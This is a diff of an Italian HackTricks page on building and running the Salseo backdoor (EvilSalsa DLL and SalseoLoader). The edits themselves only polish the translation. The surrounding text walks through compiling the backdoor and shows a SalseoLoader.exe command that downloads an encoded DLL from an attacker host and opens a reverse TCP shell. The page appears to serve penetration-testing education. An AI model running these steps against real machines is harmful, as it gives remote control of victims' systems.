@@ -10,12 +10,12 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 * Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
 * **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos su github.
+* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.
 
 </details>
 {% endhint %}
 
-## Compiling the binaries
+## Compilare i binari
 
 Scarica il codice sorgente da github e compila **EvilSalsa** e **SalseoLoader**. Avrai bisogno di **Visual Studio** installato per compilare il codice.
 
@@ -31,7 +31,7 @@ Poi, costruisci entrambi i progetti (Build -> Build Solution) (All'interno dei l
 
 ![](<../.gitbook/assets/image (381).png>)
 
-## Prepare the Backdoor
+## Preparare il Backdoor
 
 Prima di tutto, dovrai codificare il **EvilSalsa.dll.** Per farlo, puoi usare lo script python **encrypterassembly.py** oppure puoi compilare il progetto **EncrypterAssembly**:
 
@@ -51,9 +51,9 @@ Ok, ora hai tutto ciò di cui hai bisogno per eseguire tutto il Salseo: il **Evi
 
 ## **Esegui il backdoor**
 
-### **Ottenere una shell inversa TCP (scaricando dll codificata tramite HTTP)**
+### **Ottenere una reverse shell TCP (scaricando dll codificata tramite HTTP)**
 
-Ricorda di avviare un nc come listener della shell inversa e un server HTTP per servire l'evilsalsa codificato.
+Ricorda di avviare un nc come listener della reverse shell e un server HTTP per servire l'evilsalsa codificato.
 ```
 SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
 ```
@@ -102,7 +102,7 @@ Apri il progetto SalseoLoader utilizzando Visual Studio.
 
 Nella tua cartella di progetto sono apparsi i file: **DllExport.bat** e **DllExport\_Configure.bat**
 
-### **Dis**installa DllExport
+### **Dis**installare DllExport
 
 Premi **Disinstalla** (sì, è strano ma fidati, è necessario)
 
@@ -130,7 +130,7 @@ Seleziona **Tipo di output = Libreria di classi** (Progetto --> Proprietà Salse
 
 ![](<../.gitbook/assets/image (847).png>)
 
-Seleziona **piattaforma x64** (Progetto --> Proprietà SalseoLoader --> Compila --> Target piattaforma = x64)
+Seleziona **piattaforma x64** (Progetto --> Proprietà SalseoLoader --> Compilazione --> Target piattaforma = x64)
 
 ![](<../.gitbook/assets/image (285).png>)
 
@@ -138,7 +138,7 @@ Per **compilare** la soluzione: Compila --> Compila soluzione (All'interno della
 
 ### Testa la DLL generata
 
-Copia e incolla la DLL dove vuoi testarla.
+Copia e incolla la DLL dove desideri testarla.
 
 Esegui:
 ```
